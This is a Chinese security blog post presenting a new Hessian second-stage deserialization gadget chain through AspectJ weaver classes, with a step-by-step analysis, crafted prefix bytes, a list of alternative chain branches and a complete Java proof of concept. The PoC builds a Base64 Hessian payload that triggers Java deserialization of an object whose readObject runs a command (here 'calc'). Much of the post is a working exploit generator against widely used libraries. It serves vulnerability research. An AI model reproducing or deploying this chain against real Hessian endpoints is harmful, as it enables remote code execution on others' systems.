# 漏洞篇 - Hessian Aspectj 二次反序列化新链
> 2026-03-07
> 来源：https://changeyourway.github.io/2026/03/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87%20-%20Hessian%20Aspectj%20%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B0%E9%93%BE/

起因是我在用自制的 codeql mcp 工具测试 2026 alictf Fury 反序列化时，发现了一条新的二次反序列化链，可惜等构造完了才发现这个链子上的类没有实现 serializable ，本以为要难产了，jsjcw 师傅提醒说可以用在 hessian 上，因为是 toString 触发的，一语点醒梦中人，测试了确实可以，故而分享一下这条生来残缺的链子。

## 利用链总结

这条链从 toString 到 readObject 全都是 Aspectj 依赖中的类：

```
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjweaver</artifactId>
    <version>1.9.7</version>
</dependency>
<dependency>
     <groupId>com.caucho</groupId>
     <artifactId>hessian</artifactId>
     <version>4.0.66</version>
</dependency>
```

利用链如下：

```
LazyMethodGen.toString
LazyMethodGen.toLongString
LazyMethodGen.print
LazyMethodGen.printAspectAttributes
Utility.readAjAttributes
AjAttribute.read
ResolvedTypeMunger.read
NewMethodTypeMunger.readMethod
ResolvedTypeMunger.readSourceLocation # 调用 readObject
```

搭配 hessian2 调 toString ，就是一条完整的链子了：

```
Hessian2Input#readObject
Hessian2Input#readObjectDefinition
Hessian2Input#readString
Hessian2Input#expect
```

## 原理分析

### 利用链分析

hessian2 调 toString 不再分析，直接从 LazyMethodGen.toString 开始：

![](https://changeyourway.github.io/images/image-20260307112709-dp5ql4g.png)

这里调用 LazyMethodGen.toLongString ，并传入 weaverVersion ，而 weaverVersion 是从 this.enclosingClass 的 myType 属性中获取的，这个 myType 是 BcelObjectType 类型，后面有用：

![](https://changeyourway.github.io/images/image-20260307113233-1az2aiq.png)

跟进到 LazyMethodGen.toLongString ，这里调用 LazyMethodGen.print ，传入了一个空的流和 weaverVersion ：

![](https://changeyourway.github.io/images/image-20260307113336-y7zln6r.png)

跟进到 LazyMethodGen.print ，这里调用 LazyMethodGen.printAspectAttributes：

![](https://changeyourway.github.io/images/image-20260307113612-g14x570.png)

LazyMethodGen.printAspectAttributes 又调用了 Utility.readAjAttributes ：

![](https://changeyourway.github.io/images/image-20260307113757-io8tw0r.png)

注意传入的参数，第二个参数来自于 LazyMethodGen 的 attributes 属性：

```
List<AjAttribute> as = org.aspectj.weaver.bcel.Utility.readAjAttributes(this.getClassName(), (Attribute[])this.attributes.toArray(new Attribute[0]), context, (World)null, weaverVersion, new BcelConstantPoolReader(this.enclosingClass.getConstantPool()));
```

Utility.readAjAttributes 的第二个参数是一个 Attribute 数组，其中的每一项都会被读取，先强转为 Unknown 类型，然后调用 u.getBytes() 来获取这个 Unknown 对象的字节流，而这个字节流就是后续被反序列化的字节流：

![](https://changeyourway.github.io/images/image-20260307143849-qz7yi24.png)

看到这里可能会以为这个字节流不可控了，但实际上 Unknown.getBytes() 也不过是获取其 bytes 属性，仍然在掌握之中：

![](https://changeyourway.github.io/images/image-20260307114334-avuwdqz.png)

接着跟进 AjAttribute.read ，根据传入的 name 不同，进入不同的处理逻辑，name 来自于 Unknown.getName() ，同样是可以控制的，控制其值为 org.aspectj.weaver.TypeMunger ，就可以进入 TypeMunger 的处理逻辑，调用 ResolvedTypeMunger.read 方法：

![](https://changeyourway.github.io/images/image-20260307114524-4u1pk3s.png)

跟进 ResolvedTypeMunger.read ，其会先调用 ResolvedTypeMunger.Kind.read 获取类型，再针对不同类型进入不同的处理逻辑：

![](https://changeyourway.github.io/images/image-20260307115137-s78bqzv.png)

ResolvedTypeMunger.Kind.read 就是读取流中的第一个字节，根据数值判断，不麻烦，第一个字节设置为 2（其它的应该也可以）：

![](https://changeyourway.github.io/images/image-20260307115259-umfbkvm.png)

如此就进入 Method 的处理逻辑，调用 NewMethodTypeMunger.readMethod ：

![](https://changeyourway.github.io/images/image-20260307140224-c4od0an.png)

而在这其中比较难处理的是 ResolvedMemberImpl.readResolvedMember 方法，它会读取相当多的字节，需要确保这个过程不出异常，才能进入后续逻辑：

![](https://changeyourway.github.io/images/image-20260307115646-t6kdkya.png)

MemberKind.read 从流中读取一个字节，以确定成员类型，这个字节的数值只能是 1-9 ：

![](https://changeyourway.github.io/images/image-20260307115804-ufeo6jw.png)

接下来 s.isAtLeast169() 判断版本是不是 ≥ 1.6.9 ，若是则读取一个 boolean，实际上 s.isAtLeast169() 最终是获取了一个 major\_version 并判断它是不是大于 7 ，这个 major\_version 在后续还有用，后续其构造的数值要求是 2 ，使得这里 compressed 是 false ：

![](https://changeyourway.github.io/images/image-20260307131215-k5v8nki.png) ![](https://changeyourway.github.io/images/image-20260307131157-us0k3yl.png)

由于 compressed 为 false ，接下来进入 UnresolvedType.read ，其中使用 readUTF() 。

readUTF():

1.  先读取 2 字节 (unsigned short) → 表示字符串字节长度 length
2.  再读取 length 个字节 → 这些字节是 UTF-8 编码字符串

根据读取到的字符串判断类型签名（signature），并根据该签名构造一个 UnresolvedType 对象：

![](https://changeyourway.github.io/images/image-20260307131511-zha4u8i.png)

签名如果为 @missing@ ，返回一个 ResolvedType.MISSING ，表示该类型不存在 / 无法解析。或者签名可以为其它一些常见类型比如 `Ljava/lang/String;` 。由于后面会利用这个 declaringType 创建一个 ResolvedMemberImpl 对象，要想后面不出错，这里的签名就不能是 @missing@ ，姑且设置一个 `Ljava/lang/Object;` 。

![](https://changeyourway.github.io/images/image-20260307135435-nxx1ksa.png)

接着 s.readInt(); 读取一个 int ，也就是四个字节，获得一个 modifiers ，设置为 1 ；

s.readUTF() 读取一个 UTF 字符串，获得一个 name ，这个要用作方法名；

s.readUTF() 读取一个 UTF 字符串，获得一个 signature；

然后用这五个值去构造一个 ResolvedMemberImpl 对象，只需要让它不报错就行了，我这样构造：

```
ResolvedMemberImpl {
    kind = METHOD
    declaringType = java.lang.Object
    modifiers = public
    name = testMethod
    signature = ()V
    exceptions = []
}
```

后续读取 m.checkedExceptions ，m.start ，m.end ，都设置为 0 即可。

由于 s.getMajorVersion() 需要设置为 2 ，后续还要再读取一个 tvcount ，为避免麻烦同样设置为 0 。

随后这个 ResolvedMemberImpl.readResolvedMember 就算走完了，返回到 NewMethodTypeMunger.readMethod ，往下一步进入到 readSuperMethodsCalled 方法里，还是一样，s.isAtLeast169() 为 false ，这里会读取一个 int ：

![](https://changeyourway.github.io/images/image-20260307140410-qon0lsa.png)

返回到 NewMethodTypeMunger.readMethod ，接着往下一步就进入到 ResolvedTypeMunger.readSourceLocation ：

![](https://changeyourway.github.io/images/image-20260307140637-drvuj4d.png)

首行就是判断 s.getMajorVersion() 是否小于 2 ，这就是为什么前面要将 major\_version 设置为 2 ，这样既可以顺利通过判断，又能在 ResolvedMemberImpl.readResolvedMember 中尽可能少进入一些判断。

随后由于 s.isAtLeast169() 为 false ，&& 为截断符，所以这个 s.readByte() 就不会读取了，进入 else 处理逻辑。

前面的 readxxx 都会将字节流中的字节取走，后面的 readObject() 只会反序列化剩下的字节，把恶意对象的字节流放在那些必要的字节之后即可。

### 前缀字节流

最后我构造的前缀字节流如下：

```
new byte[]{2, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 0, 0, 0, 1, 0, 10, 116, 101, 115, 116, 77, 101, 116, 104, 111, 100, 0, 3, 40, 41, 86, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
```

解释一下：

\[0\]: ResolvedTypeMunger.Kind 设置为 Method

\[1\]: MemberKind 设置为 METHOD

\[2-21\]: declaringType 设置为 Ljava/lang/Object;

\[22-25\]: modifiers 设置为 public

\[26-37\]: name 设置为 testMethod

\[38-42\]: signature 设置为 ()V

\[43-44\]: m.checkedExceptions 设置为 0

\[45-48\]: m.start 设置为 0

\[49-52\]: m.end 设置为 0

\[53-56\]: tvcount 设置为 0

\[57-60\]: readSuperMethodsCalled 方法读取 4 字节

如此便能顺利通过前面的流程，将剩下的字节流反序列化。

### MajorVersion 设置

前面还遗留了一个问题就是如何将 s.getMajorVersion() 设置为 2 。

在 AjAttribute.read 中会调用 s.setVersion 设置其 version 属性：

![](https://changeyourway.github.io/images/image-20260307145230-j922brp.png) ![](https://changeyourway.github.io/images/image-20260307145254-gwzigjc.png)

而这个 WeaverVersionInfo 对象其实就是最初 LazyMethodGen 的属性中获取的

![](https://changeyourway.github.io/images/image-20260307145511-ay1eh81.png)

只需要将 LazyMethodGen.enclosingClass.myType.wvInfo.major\_version 属性设置为 2就可以了。

### lazyMethodGen 的初始化问题

还有一个问题就是 lazyMethodGen 是懒加载的，要想设置 lazyMethodGen 的 attributes 属性，就先要调用其 initialize() 方法初始化，再反射赋值，这样后续再进入 initialize() 就不会将已有的属性值又重新初始化清空一遍了。在构造序列化数据时要注意。

由于 initialize() 方法是私有的，我选择调用一次 lazyMethodGen.getAnnotations() 来间接调用 initialize() 方法：

![](https://changeyourway.github.io/images/image-20260307150657-ewxic2r.png)

## POC

创建一个 Person 类，实现 readObject 方法，在其中执行命令：

```
package hessianTest;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable {
    public Person() {}
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Runtime.getRuntime().exec("calc");
    }
}
```

验证 POC：

```
package hessianTest;


import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
//import com.alibaba.com.caucho.hessian.io.Hessian2Input;
//import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import org.apache.toStringTest;
import org.aspectj.apache.bcel.classfile.*;
import org.aspectj.apache.bcel.util.ClassLoaderRepository;
import org.aspectj.weaver.ReferenceType;
import org.aspectj.weaver.bcel.BcelObjectType;
import org.aspectj.weaver.bcel.BcelWorld;
import org.aspectj.weaver.bcel.LazyClassGen;
import org.aspectj.weaver.bcel.LazyMethodGen;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;

public class EXP {
    public static byte[] Hessian2_Serial(Object o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(o);
        hessian2Output.flushBuffer();
        return baos.toByteArray();
    }

    public static Object Hessian2_Deserial(byte[] bytes) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        Hessian2Input hessian2Input = new Hessian2Input(bais);
        Object o = hessian2Input.readObject();
        return o;
    }

    public static void main(String[] args) throws Exception {

        // 1. Create BcelWorld
        BcelWorld world = new BcelWorld();

        // 2. Create JavaClass using ClassLoaderRepository
        ClassLoaderRepository repo = new ClassLoaderRepository(toStringTest.class.getClassLoader());
        JavaClass javaClass = repo.loadClass("java.lang.Object");

        // 3. Create ReferenceType
        // Signature for java.lang.Object is Ljava/lang/Object;
        ReferenceType referenceType = new ReferenceType("Ljava/lang/Object;", world);

        // 4. Create BcelObjectType via reflection (package-private constructor)
        // Constructor: BcelObjectType(ReferenceType, JavaClass, boolean, boolean)
        Class<?> botClass = Class.forName("org.aspectj.weaver.bcel.BcelObjectType");
        Constructor<?> constructor = botClass.getDeclaredConstructor(
                ReferenceType.class,
                JavaClass.class,
                boolean.class,
                boolean.class
        );
        constructor.setAccessible(true);
        BcelObjectType bcelObjectType = (BcelObjectType) constructor.newInstance(referenceType, javaClass, false, false);

        // Modification: Force WeaverVersionInfo major_version >= 2 via reflection
        java.lang.reflect.Method getWeaverVersionAttribute = botClass.getDeclaredMethod("getWeaverVersionAttribute");
        getWeaverVersionAttribute.setAccessible(true);
        Object wvInfo = getWeaverVersionAttribute.invoke(bcelObjectType);

        if (wvInfo != null) {
            Field majorVersionField = wvInfo.getClass().getDeclaredField("major_version");
            majorVersionField.setAccessible(true);
            majorVersionField.setShort(wvInfo, (short) 2);
            System.out.println("Forced WeaverVersionInfo major_version to: " + majorVersionField.getShort(wvInfo));
        }

        // 5. Create LazyClassGen using BcelObjectType
        LazyClassGen lazyClassGen = new LazyClassGen(bcelObjectType);

        // 6. Create first LazyMethodGen (lmg1)
        // We need a Method object. Get the first method from JavaClass.
        Method[] methods = javaClass.getMethods();
        Method method = methods[0];
        LazyMethodGen lazyMethodGen = new LazyMethodGen(method, lazyClassGen);

        // Force initialization of LazyMethodGen before setting attributes via reflection.
        // LazyMethodGen uses lazy initialization. The initialize() method overwrites the 'attributes' field.
        // If we set 'attributes' before initialization, our value will be overwritten when initialize() is triggered later.
        lazyMethodGen.getAnnotations();

        Class<? extends LazyMethodGen> lazyMethodGenClass = lazyMethodGen.getClass();
        Field attributesField = lazyMethodGenClass.getDeclaredField("attributes");
        attributesField.setAccessible(true);
        List<Attribute> attributes = new ArrayList<>();

        // Create a new ConstantPool with the required string
        ConstantPool cp = javaClass.getConstantPool();
        Constant[] constants = new Constant[cp.getLength() + 1];
        for (int i = 0; i < cp.getLength(); i++) {
            constants[i] = cp.getConstant(i);
        }
        constants[cp.getLength()] = new ConstantUtf8("org.aspectj.weaver.TypeMunger");
        ConstantPool newCp = new ConstantPool(constants);

        // Construct prefix bytes
        byte[] memberBytes = new byte[]{
                2, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 0, 0, 0, 1, 0, 10, 116, 101, 115, 116, 77, 101, 116, 104, 111, 100, 0, 3, 40, 41, 86, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0
        };

        // Serialize a simple Class
        Person person = new Person();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(person);
        oos.close();

        byte[] objectBytes = baos.toByteArray();

        // Combine arrays
        byte[] bytes = new byte[memberBytes.length + objectBytes.length];
        System.arraycopy(memberBytes, 0, bytes, 0, memberBytes.length);
        System.arraycopy(objectBytes, 0, bytes, memberBytes.length, objectBytes.length);

        Unknown unknown = new Unknown(cp.getLength(), bytes.length, bytes, newCp);
        attributes.add(unknown);
        attributesField.set(lazyMethodGen, attributes);

        byte[] data = Hessian2_Serial(lazyMethodGen);

        byte[] poc = new byte[data.length + 1];
        System.arraycopy(new byte[]{67}, 0, poc, 0, 1);
        System.arraycopy(data, 0, poc, 1, data.length);

        System.out.println(Base64.getEncoder().encodeToString(poc));

        Hessian2_Deserial(poc);
    }
}
```

## 其它利用链

其实在查询的时候这条链还有许多分支，我没有一一验证了，感兴趣的师傅可以看看。

```
LazyMethodGen.toString
 -> LazyMethodGen.toLongString
   -> LazyMethodGen.print
     -> LazyMethodGen.printAspectAttributes # this.attributes 可控
       -> Utility.readAjAttributes
         -> AjAttribute.read # u.getBytes() 返回其 bytes 属性，可控。
           ├── ResolvedTypeMunger.read
           │     ├─ NewConstructorTypeMunger.readConstructor
           │     ├─ NewFieldTypeMunger.readField
           │     ├─ NewMemberClassTypeMunger.readInnerClass
           │     └─ NewMethodTypeMunger.readMethod
           │
           │       -> ResolvedTypeMunger.readSourceLocation
           │         -> readObject
           │
           └── WeaverStateInfo.read
                 -> ResolvedTypeMunger.read
                     ├─ NewConstructorTypeMunger.readConstructor
                     ├─ NewFieldTypeMunger.readField
                     ├─ NewMemberClassTypeMunger.readInnerClass
                     └─ NewMethodTypeMunger.readMethod

                         -> ResolvedTypeMunger.readSourceLocation
                           -> readObject
```

## 结语

若是我一开始便发现没有继承 serializable ，恐怕不会多看一眼，来发掘残缺的它的价值了。

特别鸣谢：@jsjcw

‍
